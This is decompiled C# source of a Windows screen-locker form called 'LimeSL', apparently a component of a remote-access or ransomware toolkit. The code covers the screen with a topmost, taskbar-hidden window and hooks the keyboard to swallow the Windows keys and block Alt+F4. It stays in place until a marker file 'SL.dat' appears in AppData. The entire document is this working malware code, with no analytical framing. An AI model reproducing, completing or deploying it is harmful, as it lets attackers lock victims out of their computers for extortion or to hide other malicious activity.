using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
internal class LimeSL : Form
{
	public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private IContainer components;

	private const long KEYEVENTF_EXTENDEDKEY = 1L;

	private const long KEYEVENTF_KEYUP = 2L;

	private const byte VK_LWIN = 91;

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYUP = 257;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public LimeSL()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(9f, 20f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Lime);
		((Form)this).set_ClientSize(new Size(278, 244));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("LimeSL");
		((Form)this).set_Opacity(0.5);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("LimeSL");
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		Process currentProcess = Process.GetCurrentProcess();
		ProcessModule mainModule = currentProcess.MainModule;
		string lpModuleName = mainModule.ModuleName;
		return SetWindowsHookEx(13, proc, GetModuleHandle(ref lpModuleName), 0u);
	}

	public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Invalid comparison between Unknown and I4
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Invalid comparison between Unknown and I4
		if ((nCode >= 0) & (wParam == (IntPtr)257))
		{
			Keys val = (Keys)Marshal.ReadInt32(lParam);
			if ((int)val == 91 || (int)val == 92)
			{
				try
				{
					keybd_event(251, 0, 1L, 0L);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		_hookID = SetHook(_proc);
		while (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SL.dat"))
		{
			Application.DoEvents();
		}
		((Form)this).Close();
	}

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Invalid comparison between Unknown and I4
		if (e.get_Alt() && (int)e.get_KeyCode() == 115)
		{
			e.set_Handled(true);
		}
	}

	private void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
		UnhookWindowsHookEx(_hookID);
	}
}
